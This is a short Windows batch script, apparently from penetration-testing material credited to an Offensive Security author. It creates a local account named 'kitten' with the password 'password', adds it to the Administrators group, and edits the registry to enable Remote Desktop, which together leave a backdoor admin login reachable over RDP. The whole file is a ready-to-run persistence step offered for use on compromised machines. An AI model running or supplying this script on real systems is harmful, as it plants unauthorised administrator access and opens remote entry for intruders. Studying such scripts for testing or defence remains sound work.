@ECHO OFF
::batch file that adds user to Administrators and enables RDP - all credit to Siddicky at Offsec
TITLE Add user
ECHO Adding user
net user kitten password /add
net localgroup Administrators kitten /add
Echo Enabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ECHO User Added
net users
